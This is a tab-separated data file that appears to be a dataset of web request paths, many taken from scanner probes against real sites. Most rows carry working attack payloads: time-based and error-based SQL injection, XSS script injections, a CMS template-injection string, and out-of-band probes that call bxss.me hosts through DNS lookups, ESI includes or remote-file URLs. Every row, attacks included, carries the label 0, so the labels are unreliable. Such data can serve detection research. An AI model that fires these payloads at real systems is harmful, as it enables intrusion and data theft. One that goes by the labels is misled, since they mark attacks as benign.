sentences	labels
/******/_content/download.jsp?owner=1707212448&urltype=if(now()=sysdate(),sleep(12),0)&wbfileid=67726 \r\n\r\n 	 0
/******/system/2017/10/27/javascript:window.close(); \r\n\r\n 	 0
/****/system/2021/09/04/javascript:window.close(); \r\n\r\n 	 0
/****/web/search?searchword=1&channelid=287219%') or 1023=0133 and '%'='&perpage=24&templet=1&token=1 \r\n\r\n 	 0
/****/mydevice/index.jsp?locale=""><script>alert(777)</script> \r\n\r\n 	 0
/jsearchfront'||'/********/jcse/110105008056111/16/images/hanweb.css \r\n\r\n 	 0
/****/web/search?channelid=299868&perpage=1000%') and 8001=8001  \r\n\r\n 	 0
/**********/visualizza_tabelle.php?anno=2019&id_sessione=&tipo_tabella=prenotazioni&subtotale_selezionate=1&num_cambia_pren=1&cerca_id_passati=1&cambia1=3134671"</script><script>alert(document.domain)</script> \r\n\r\n 	 0
/****/gw_admin.php?a="">alert(777);&t=settings \r\n\r\n 	 0
/****/zxxksh/javascript:void(0); \r\n\r\n 	 0
/****/tag_test_action.php?partcode={dede:field name='source' runphp='yes'}echo md52001027349&token=&url=a&{/dede:field}= \r\n\r\n 	 0
/****/zt/yqfkzccs/dsjzccs/wzszc/\"javascript:void(0)\" \r\n\r\n 	 0
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448') and 9362=6961 and ('1'='1 \r\n\r\n 	 0
/****/index.php?vyhl='>alert(777)&lang=cze \r\n\r\n 	 0
/****/userrole/modal_sendmail.aspx?from=user&usernamecollection=anony' and ('anony' 'secsiteserverinj' @@version)>0 and '1'='1 \r\n\r\n 	 0
/***/2021/4/15/art_34_229168.html \r\n\r\n 	 0
/****/mtll/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 0
/****/bysw/202001/t20200119_'.gethostbyname(lc('hitgk'.'uulengzi91143.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(119).chr(86).chr(120).chr(80).'.html \r\n\r\n 	 0
/********/2?page=_cloud_eye_trainer_56524eb847014a30f03212dadb9defb9'"()&%<acu><script>9112(9131)</script> \r\n\r\n 	 0
/**/vc/interface/visit.jsp?i_articleid=0&i_columnid=1&i_webid=1&type=1&url[0]=exp'and/**/extractvalue(1,concat(char(126),md5(1902681869)))and'&url[1]==1 \r\n\r\n 	 0
/*******/taglib/new.lib.php \r\n\r\n 	 0
/****/category/zijinqudao?page=*/-->'""></iframe></script></style></title></textarea><script >alert(54810)</script> \r\n\r\n 	 0
/****/xxgkml/lzyj<esi:include src=""http://bxss.me/rpb.png""/>/ \r\n\r\n 	 0
/****/system/2007/03/12/javascript:dozoom(14) \r\n\r\n 	 0
/******/web/bxss.me/theme/default/css/jpage.css \r\n\r\n 	 0
/*****/system/2021/12/04/javascript:void(0); \r\n\r\n 	 0
/************/investment-advisory/2019-04-19/0'xor(if(now()=sysdate(),sleep(9),0))xor'z.html \r\n\r\n 	 0
/**********/system/2014/11/11/011551628.shtml \r\n\r\n 	 0
/****/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/1.htm \r\n\r\n 	 0
/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/********/show.do \r\n\r\n 	 0
/****/mtgz' and 2*3*8=6*8 and 'prja'='prja/2021_mtgz/202107/t20210712_310551.html \r\n\r\n 	 0
/******/web/jpage%' and 2*3*8=6*8 and 'aako'!='aako%/theme/simple/css/jpage.css \r\n\r\n 	 0
/****/czgk/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zzqhlsdlptcyygwh/\"javascript:void(0)\" \r\n\r\n 	 0
/******/system/2019/08/22/javascript:window.close(); \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/"><script>alert(691)</script>?_=1630311553645 \r\n\r\n 	 0
/****/gjdjbn/djbn_gjjs/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 0
/************/template/jcse/http://bxss.me/t/fit.txt/16/images/plugin/mainframe/spellcheck.js \r\n\r\n 	 0
/****/20210805/javascript:void(0); \r\n\r\n 	 0
/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/******/index.html \r\n\r\n 	 0
/****/zfwjn' and 2*3*8=6*8 and 'stsr'='stsr/1079/1081/list.html \r\n\r\n 	 0
/******/system/2016/11/03/javascript:window.close(); \r\n\r\n 	 0
/****/jgzn/znjs'||'.htm \r\n\r\n 	 0
/le-buzios/**/wenlan.php \r\n\r\n 	 0
/****/中国/*/-->'""></iframe></script></style></title></textarea><script >alert(25222)</script> \r\n\r\n 	 0
/***/2021/7/12/art_35_http://bxss.me/t/xss.html? \r\n\r\n 	 0
/****/user/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) \r\n\r\n 	 0
/****/202108/encodeuricomponent(window.location.href) \r\n\r\n 	 0
/****/zzxxgk/tjj/zfxxgkml_2127/jytabljg_http://bxss.me/t/xss.html? \r\n\r\n 	 0
/***********/jinrongqihuo/guzhiqihuo%' and 2*3*8=6*8 and 'uary'!='uary%/ \r\n\r\n 	 0
/****/jtdt/jt16/javascript:stranbody(); \r\n\r\n 	 0
/****/thumb.php?src=<body onload=alert(777)>.jpg \r\n\r\n 	 0
/******/n239751'||'/index.html \r\n\r\n 	 0
/****/xxgkml/zfczyjs/list.html?new="".gethostbyname(lc(""hitle"".""pbdompeld594a.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(106).chr(76).chr(116).chr(72)."" \r\n\r\n 	 0
/****/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/csjs/zcwj/1.htm \r\n\r\n 	 0
/**********/system/2021/11/20/javascript:window.print() \r\n\r\n 	 0
/****/jtdt/jt17_6388/javascript:stranbody(); \r\n\r\n 	 0
/**/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php \r\n\r\n 	 0
/*****/dash_additem.php?additem_form=alert(777); \r\n\r\n 	 0
/****/abantecart/index.php?rt="><script>alert(777);</script>&s=your_admin"><script>alert(777);</script>&token=957bf7cb71078f4471807da1c42d721e"><script>alert(777);</script> \r\n\r\n 	 0
/************/template/jcse/http://bxss.me/t/fit.txt?.jpg/16/images/plugin/mainframe/spellcheck.js \r\n\r\n 	 0
/**/system/2021/10/22/javascript:void(0); \r\n\r\n 	 0
/*****/fiyo/?app=article&view=item31ab2"">alert(777)0ccba&id=186 \r\n\r\n 	 0
/wp-content/*******/wp-booking-calendar/public/ajax/getmonthcalendar.php?calendar_id=1' and 1=dbms_pipe.receive_message(7d,15) and '1'='1&month=4&publickey=6lcdyoasaaaaacsevy6g4yo1bqxcgw15s15mb36- &wpml_lang=&year=2018 \r\n\r\n 	 0
/**/index/goods' and 2*3*8=6*8 and '667d'='667d/cate_id/179.html \r\n\r\n 	 0
/****/category/:'""()&%<acx><script >dgy2(9961)</script> \r\n\r\n 	 0
//***********/xxgknb/2013/list.html \r\n\r\n 	 0
/****/category/silushangji?page=1*/-->'""></iframe></script></style></title></textarea><script >alert(23026)</script> \r\n\r\n 	 0
/****/bysw/swsj/201610/t20161010_456.html?leader=苏君<esi:include src=""http://bxss.me/rpb.png""/> \r\n\r\n 	 0
/**/ourbusiness/finance/202101/t20210129_269909.html" and "x"="y \r\n\r\n 	 0
/****/web/search?page=2&channelid=253477&searchword=1' and 4058=6841  \r\n\r\n 	 0
/*****/mswpmm/common/signin.aspx?cbautosignin=""alert(777) \r\n\r\n 	 0
/****/system/2021/11/13/javascript:window.print() \r\n\r\n 	 0
/****/czgk/bmjs/zzqfyxt/zwszjrmfy/\"javascript:void(0)\" \r\n\r\n 	 0
/************/template/jcse/110105008056111/16/images/plugin/voice/voicerecorder.js/"><script>alert(4694)</script> \r\n\r\n 	 0
/****/byszf/201610/t20161016_541.html?leader="".gethostbyname(lc(""hitxl"".""prxxhvkmc2121.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(99).chr(74).chr(100).chr(75)."" \r\n\r\n 	 0
/***/player.swf?autostart=true&file="'><img src="/wf_xsrf2703.html"> \r\n\r\n 	 0
/******/web/jpage//xfs.bxss.me/default/css/jpage.css \r\n\r\n 	 0
/****/rsrm/201809/t20180929_1087289.html \r\n\r\n 	 0
/wp-content/*******/wp-events-calendar/public/ajax/geteventslist.php?calendar_id=1&day=1' and 1=dbms_pipe.receive_message(7d,15) and '1'='1&month=5&pag=1&year=2018 \r\n\r\n 	 0
/****/main/messages/outbox.php?f=social"" onmouseover=""confirm(777) \r\n\r\n 	 0
/****/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/fdzdgknr/ysjs/1.htm \r\n\r\n 	 0
/****/bysrd/201611/t20161129_78963.html?leader=温旭东<esi:include src=""http://bxss.me/rpb.png""/> \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/"><script>alert(852)</script>?_=1630311614072 \r\n\r\n 	 0
socket.gethostbyname('hitkd' 'xctfnpesd64db.bxss.me.')[3].to_s) '/****/110105008056111/16/images/result.css \r\n\r\n 	 0
/******/wp-admin/admin.php?where1=alert(777)&searchsubmit=buscar&page=nsp_search \r\n\r\n 	 0
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448' or 1043=9126  \r\n\r\n 	 0
/**/ui/lib/easyui' and 2*3*8=6*8 and 'y0dy'='y0dy/plugins/jquery.linkbutton.js \r\n\r\n 	 0
/****/zt/2020jgnb/ \r\n\r\n 	 0
/****/20210923/javascript:void(0); \r\n\r\n 	 0
/wp-content/*******/slidedeck2/js/zeroclipboard/zeroclipboard.swf?id="))}catch(e){}if(!self.a)self.a=!prompt(document.domain)//&width&height \r\n\r\n 	 0
/******/system/2017/08/01/javascript:void(0); \r\n\r\n 	 0
/******/user/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) \r\n\r\n 	 0
/**/ui/lib/easyui/http://bxss.me/t/fit.txt/bootstrap/messager.css \r\n\r\n 	 0
/****/zdlygk'||'/gytdsdfwzs/wzs/zcwj.htm \r\n\r\n 	 0
/****/zzxxgk/cl/javascript:void(0); \r\n\r\n 	 0
/************/http://bxss.me/t/fit.txt?.jpg/jcse/110105008056111/16/images/main.css \r\n\r\n 	 0
/****/zzxxgk/tjj/zfxxgkml_2127/jgzn_2042/list'||'.html \r\n\r\n 	 0
/***/ajax_cmd.php?cmd=completgraphyrecording&filename=<img src=a onload=alert(777)> \r\n\r\n 	 0
socket.gethostbyname(""hitoz"" ""opfdmtji04ff5.bxss.me."")[3].to_s) ""/**/11/art_34_242320.html \r\n\r\n 	 0
/****/atutor/mods/_standard/calendar/getlanguage.php?token=calendar_next<script>alert(777)</script>&pub=1 \r\n\r\n 	 0
/****/ \r\n\r\n 	 0
/******/xxwzqh/"><script>alert(53)</script> \r\n\r\n 	 0
/****/system/2018/08/22/javascript:dozoom(9) \r\n\r\n 	 0
/***/open-flash-chart/open-flash-chart.swf?get-data=(function(){alert(document.domain)})() \r\n\r\n 	 0
/wp-content/*******/nextgen-gallery/xml/media-rss.php?mode=<script>alert(uvhumk1v)</script> \r\n\r\n 	 0
/****/system/2021/10/30/javascript:void(0); \r\n\r\n 	 0
/*/191211'""()&%<acx><script >br7s(9343)</script>-8/index/d7c921b2c59d284228d4f6d2d18d0cae.css \r\n\r\n 	 0
/****/czgk/bmyjs/zzqzfzcbmyzstsjg/zzqybj/\"javascript:void(0)\" \r\n\r\n 	 0
/****/system/2008/01/04/javascript:window.close(); \r\n\r\n 	 0
/**/system/count/ \r\n\r\n 	 0
/******/scripts/booking/eventlist.php?serviceid=1337" onmouseover="alert(777) \r\n\r\n 	 0
/****/system/2021/11/19/javascript:window.close(); \r\n\r\n 	 0
/**/productlistcategory.html?productcategoryid=(select char(97) char(110) char(111) char(110) char(121) char(109) char(111) char(117) char(115) char(95) char(115) char(104) char(111) char(112))&price1=3079&&price2=3319 \r\n\r\n 	 0
/**********/system/2021/11/22/javascript:void(0); \r\n\r\n 	 0
/****/admin/dash_additem.php?additem_form=alert(777); \r\n\r\n 	 0
/******/card/ajax/schoollist.ashx?areaid=-2 \r\n\r\n 	 0
/************/template'""()&%<acx><script >qamc(9308)</script>/jcse/110105008056111/16/images/main.css \r\n\r\n 	 0
/***/2021/10/http://bxss.me/t/fit.txt?.jpg/art_31_242050.html \r\n\r\n 	 0
//***********/czgk/bmjs/gdyx/ \r\n\r\n 	 0
/****/reporting/admin/notificationpopup.php?new=1&type=cr&height=alert(777) \r\n\r\n 	 0
/******/ o.location.tostring().replace(/&/g, \r\n\r\n 	 0
/wp-content/*******/wp-soononline-page/error-log.php \r\n\r\n 	 0
/**/sustainability/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user \r\n\r\n 	 0
/****/rwfc/202009/t20200915_253522.html' and 'x'='y \r\n\r\n 	 0
/****/河南自贸区 \r\n\r\n 	 0
/*****/abantecart/index.php?limit="><script>alert(777);</script>&page=1"><script>alert(777);</script>&rt=product/special"><script>alert(777);</script>&sort="><script>alert(777);</script> \r\n\r\n 	 0
/**/contacts/' and 'x'='x \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/"><script>alert(748)</script>?_=1630311573652 \r\n\r\n 	 0
/****/xxgknb/2008/list.html?new=bxss.me \r\n\r\n 	 0
/******/css.css \r\n\r\n 	 0
/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/******/tjj/zfxxgkml_2127/jgzn_2042/list.html \r\n\r\n 	 0
/************/interfaces/autocomplete.do?begin=&end=&eq=&oq=&p=1&pg=1&pos=if(now()=sysdate(),sleep(15),0)&pq=&q=请输入关键词&searchid=1&tpl=16&websiteid=110105008056111 \r\n\r\n 	 0
/****/system/2017/03/02/javascript:window.print() \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/"><script>alert(331)</script>?_=1630311364687 \r\n\r\n 	 0
/******/dependencies/index?search="">alert(/777/) \r\n\r\n 	 0
/**/atutor/mods/_standard/calendar/getlanguage.php?token=calendar_next<script>alert(777)</script>&pub=1 \r\n\r\n 	 0
/*********/cms/javascript: \r\n\r\n 	 0
/n42684'||'/*******/n236776/c1649498/content.html \r\n\r\n 	 0
/************/template/jcse/110105008056111/16/images'""()&%<acx><script >5il4(9956)</script>/catesearchbtn.js \r\n\r\n 	 0
/****/zfwjn/1088/bxss.me/t/xss.html? \r\n\r\n 	 0
/***/2021/8/25/art_46_238394.html/""><script>alert(6648)</script> \r\n\r\n 	 0
/**/ui/lib/http://bxss.me/t/xss.html? \r\n\r\n 	 0
/**/system/count/0006000/000000000000/window.location.href \r\n\r\n 	 0
/************/account-opening-process/if(now()=sysdate(),sleep(6),0)-01-13/138.html \r\n\r\n 	 0
/****/xxgknb/http://bxss.me/t/fit.txt?.jpg/list.html \r\n\r\n 	 0
/****/system/2021/04/22/013373702.shtml/<img src="javascript:alert(303)"> \r\n\r\n 	 0
/**********/system/2011/12/10/javascript:dozoom(14) \r\n\r\n 	 0
/*****/20200917/javascript:void(0); \r\n\r\n 	 0
/****/category/yidaiyilushipin?page=1') and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),6)--  \r\n\r\n 	 0
/****/system/2021/07/10/javascript:window.print() \r\n\r\n 	 0
/*****/api/sources?resource=alert(/777/)&format=txt \r\n\r\n 	 0
/****//screens/switch/switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/images/logo-mobility-controller.gif onload=alert(777)> \r\n\r\n 	 0
/****/jbfk/20150902/1753735.html \r\n\r\n 	 0
/***/mydevice/loggedout.jsp?locale=""><script>alert(777)</script> \r\n\r\n 	 0
/***/0/10/97/27/10972771_037279.jpg \r\n\r\n 	 0
/****/rsrm/202103/encodeuricomponent(window.location.href) \r\n\r\n 	 0
/**/index.php?ac=search&at=taglist&tagkey=anony',tags) or did>1 and 101=ascii((seselectlect mid(table_name,1,1) frfromom information_schema.tables whwhereere table_schema =database() limit 1,1)) limit 1-- t t \r\n\r\n 	 0
/**/leavemessage/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user \r\n\r\n 	 0
/****/index.cfm?fuseaction=clogin.main&returnurl=&status=sendlogin&email=alert(777) \r\n\r\n 	 0
/****/admin/index.php?o=panel&a=receiver.edit&id=alert(777) \r\n\r\n 	 0
/****/zjdt/jzgl/gzdt' and 2*3*8=6*8 and 'o3qz'='o3qz/1.htm \r\n\r\n 	 0
/****/bysrd/201610/bxss.me/t/xss.html? \r\n\r\n 	 0
/****/general/diary/new/submit.php \r\n\r\n 	 0
/****/phpwiki/index.php?pagename=</script><script>alert(777)</script><!-- \r\n\r\n 	 0
/**************/2020-09-22/></script> \r\n\r\n 	 0
/****/tzgg/2020_tzgg/202009/t20200929_254154.html' and 'x'='y \r\n\r\n 	 0
/****/班列动态?page='""()&%<acx><script >5ls8(9517)</script> \r\n\r\n 	 0
/**/system/2021/01/21/javascript:void(0); \r\n\r\n 	 0
/*********/treasury/index.aspx?nodeid=394') and 2102=(select 2102 from pg_sleep(5)) and ('jjjn'='jjjn \r\n\r\n 	 0
/***/data:image/svg xml;charset=utf-8,<svg viewbox='0 0 120 120' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'><defs><line id='l' x1='60' x2='60' y1='7' y2='27' stroke='#fff' stroke-width='11' stroke-linecap='round'/></defs><g><use xlink:href='#l' opacity='.27'/><use xlink:href='#l' opacity='.27' transform='rotate(30 60,60 \r\n\r\n 	 0
/'""()&%<acx><script >9hvh(9163)</script>/210909-2/*****/d00139fee967b9a5c83cbe1cd7e911f8.css \r\n\r\n 	 0
/*****/login.html?status='</script><script>alert(777)</script> \r\n\r\n 	 0
/****/xxgkml/rsrm/list.html?new='.gethostbyname(lc('hitmd'.'rwwfofvx360d1.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(120).chr(79).chr(98).chr(78).' \r\n\r\n 	 0
/****/20170505/javascript:void(0); \r\n\r\n 	 0
/**/system/2021/10/08/012205616.shtml \r\n\r\n 	 0
/****/gccb/jtysgc/ \r\n\r\n 	 0
/***/interface/comul_total.json.jsp?callback=jquery171030196352313975305_1632325579271%') and 0153=0153 and '%'=' \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/"><script>alert(6249)</script>?_=1630312269447 \r\n\r\n 	 0
/***/mswpmm/common/newaccount.aspx?btncancel=alert(777) \r\n\r\n 	 0
/**********/system/2021/12/16/javascript:window.close(); \r\n\r\n 	 0
/****/user/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) \r\n\r\n 	 0
/****/?icl_action=reminder_popup&target=javascript:alert(777);// \r\n\r\n 	 0
socket.gethostbyname(""hitia"" ""oticbxee5fa44.bxss.me."")[3].to_s) ""/*****/sz/202108/t20210806_185416.html \r\n\r\n 	 0
/cgi-bin/*******/gvideos.php?gid=1 and 1=2 \r\n\r\n 	 0
/****/zt/gwydscddc/ \r\n\r\n 	 0
/****/zjdt/zjdt/gzdt'||'/145.htm \r\n\r\n 	 0
/*****/system/2019/09/23/javascript:void(0); \r\n\r\n 	 0
/****/czgk/bmyjs/zzqdwgzbmyxsjg/zzqdwxsb/\"javascript:void(0)\" \r\n\r\n 	 0
socket.gethostbyname(""hitgx"" ""edjswaxy7c0fe.bxss.me."")[3].to_s) ""/*******/jquery.panel.js \r\n\r\n 	 0
/**/ui/lib/easyui'""()&%<acx><script >smws(9514)</script>/plugins/jquery.panel.js \r\n\r\n 	 0
/*****/20211129/javascript:void(0); \r\n\r\n 	 0
/******/_content/download.jsp?urltype=news.downloadattachurl') and 6905=5167 and '1'='1&owner=1707212448&wbfileid=51419 \r\n\r\n 	 0
/****/main/myspace/student.php?keyword=31337"" onmouseover=confirm(777)//&active=0&_qf__search_user=&submit=search \r\n\r\n 	 0
/****/zzxxgk/tjj/zfxxgkzn_2123/list.html?new=bxss.me/t/xss.html? \r\n\r\n 	 0
/****/system/2021/07/11/javascript:void(0); \r\n\r\n 	 0
/****/system/2021/11/26/javascript:dozoom(9) \r\n\r\n 	 0
/************/template/jcse/110105008056111/16/images/plugin/http://bxss.me/t/fit.txt?.jpg/pinterest_grid.js \r\n\r\n 	 0
/****/web/search?channelid=222832' waitfor delay '0:0:2&searchword= \r\n\r\n 	 0
/****/index.cfm?fuseaction=clogin.main&returnurl=&status=sendlogin&email=alert(777) \r\n\r\n 	 0
/*******/xvsps5.php \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/""><script>alert(3745)</script>?_=1630312045395 \r\n\r\n 	 0
socket.gethostbyname(""hitex"" ""ubrrtffof52e8.bxss.me."")[3].to_s) ""/********/jcse/110105008056111/16/images/catesearchbtn.js \r\n\r\n 	 0
/******/jslib/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/jquery.ad-gallery2.css \r\n\r\n 	 0
/****/web/sa3/addholiday.do \r\n\r\n 	 0
/**/mswpmm/common/signin.aspx?tbpassword=alert(777)returnurl=/mswpmm/common/default.aspx \r\n\r\n 	 0
/****/stylenopower.aspx?file=css/stylelogin) having 1=1--  \r\n\r\n 	 0
/****/yt.php \r\n\r\n 	 0
/******/visitcount/visit.jsp?i_columnid=1&i_webid=1&type[0]=exp&type[1]==1'and/**/convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1148786254')))>'0 \r\n\r\n 	 0
/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/*/jquery.ellipsis.js \r\n\r\n 	 0
/****/jsrpc.php?type=0&mode=1&method=screen.get&profileidx=web.item.graph&resourcetype=17&profileidx2=updatexml(0,concat(0xa,md5(2093803098)),0) \r\n\r\n 	 0
/****/system/2021/10/02/javascript:dozoom(14) \r\n\r\n 	 0
/******/system/2017/07/27/javascript:window.print() \r\n\r\n 	 0
/******/frontcontroller?domainname=<script>alert(77729</script>&operation=160 \r\n\r\n 	 0
/****/mtgz/2021_mtgz/if(now()=sysdate(),sleep(15),0)/t20210505_273338.html \r\n\r\n 	 0
/**/products/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user \r\n\r\n 	 0
/zwgk'||'/******/gytdsdfwzs/wzs/zcwj.htm \r\n\r\n 	 0
/******/login/sysloginuser.aspx?login=error&error=</script><script>alert(document.domain)</script> \r\n\r\n 	 0
/*******/fcoz.php \r\n\r\n 	 0
/***/index.cfm?error.diagnostics="">alert(777) \r\n\r\n 	 0
/**********/ywdt.htm"onclick="_adddynclicks(& \r\n\r\n 	 0
/****/web/search?channelid=253477&keyword=the&orderby=-docreltime&outlinepage=10&page=2&perpage=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&searchword=the \r\n\r\n 	 0
/****/dqgz/202009/t20200915_253538.html and 1=1 \r\n\r\n 	 0
/****//screens/switch/switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/images/logo-mobility-controller.gif onload=alert(777)> \r\n\r\n 	 0
/***/index.php?c=user&a=login</textarea>--><xss_9a7d0c5de064d8cb87d022d6829faf95/><!--<textarea> \r\n\r\n 	 0
/****/web/search?channelid=222832&outlinepage=10; waitfor delay '0:0:2&page=4172&perpage=20 \r\n\r\n 	 0
/****/cgi-bin/ipinfo.cgi?alert(777) \r\n\r\n 	 0
/*/210719/http://bxss.me/t/xss.html? \r\n\r\n 	 0
/zwxx_11337/****/202002/t20200217_1957315.html \r\n\r\n 	 0
/*****/actionhandler/ajax_managed_services.php \r\n\r\n 	 0
/******/download/downfile.jsp?classid=0&filename=5304f109c5a94f8296864a137b39f53b.xls and 9540=9540-- uudm \r\n\r\n 	 0
/****/category/redianguanzhu?page=1 and 7967=7967-- \r\n\r\n 	 0
/****/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php \r\n\r\n 	 0
/****/tzgg/tz17_6387/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 0
/**********/system/2021/11/12/javascript:void(0); \r\n\r\n 	 0
/**/index.php \r\n\r\n 	 0
/****/20170205/javascript:void(0); \r\n\r\n 	 0
socket.gethostbyname('hityf' 'nnjcfbmaac3d3.bxss.me.')[3].to_s) '/****/list.html \r\n\r\n 	 0
/****/wzdt/?wvstest=javascript:domxssexecutionsink(1,""'/""><xsstag>()locxss"") \r\n\r\n 	 0
/****/zjdt/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/1.htm \r\n\r\n 	 0
/******/resource/code/news/click/dynclicks.jsp?clickid="and/**/extractvalue(1,concat(char(126),md5(1408548624)))and" \r\n\r\n 	 0
/****/bmkx/sswj/201907/w020190708432831719915.jpg \r\n\r\n 	 0
/*****/system/2021/11/20/javascript:window.print() \r\n\r\n 	 0
/****/category/jishuchuangxin?page=1') and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),0)--  \r\n\r\n 	 0
/*****//screens/switch/switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/images/logo-mobility-controller.gif onload=alert(777)> \r\n\r\n 	 0
